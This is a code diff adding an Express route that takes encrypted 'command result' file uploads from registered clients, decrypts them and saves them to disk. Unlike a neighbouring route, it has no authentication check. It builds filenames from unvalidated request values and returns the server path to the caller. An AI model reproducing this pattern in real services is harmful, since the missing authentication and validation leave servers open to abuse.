@@ -118,4 +118,31 @@ router.get("/reports/:id/file", requireAuth, async (req, res) => {
   res.sendFile(rec.path);
 });
 
+// Command result file upload (encrypted)
+router.post("/commands/:id/result", upload.single("file"), async (req, res) => {
+  try {
+    const id = req.params.id;
+    const clientId = (req.body.clientId as string) || (req.headers["x-client-id"] as string) || "";
+    const timestampStr = (req.body.timestamp as string) || new Date().toISOString();
+    if (!clientId || !req.file) return res.status(400).json({ message: "clientId and file required" });
+
+    const client = await prisma.client.findUnique({ where: { id: clientId } });
+    if (!client || !client.encryptionKey) {
+      return res.status(400).json({ message: "Client not registered or missing key" });
+    }
+
+    const decrypted = decryptAes256CbcPrefixedIv(req.file.buffer, client.encryptionKey);
+    const clientDir = path.join(UPLOAD_DIR, "commands", clientId);
+    fs.mkdirSync(clientDir, { recursive: true });
+    const filename = `${id}_${timestampStr.replace(/[:]/g, "-")}_${Date.now()}`;
+    const filepath = path.join(clientDir, filename);
+    fs.writeFileSync(filepath, decrypted);
+
+    res.json({ ok: true, path: filepath });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ message: "Failed to ingest command file result" });
+  }
+});
+
 export default router;
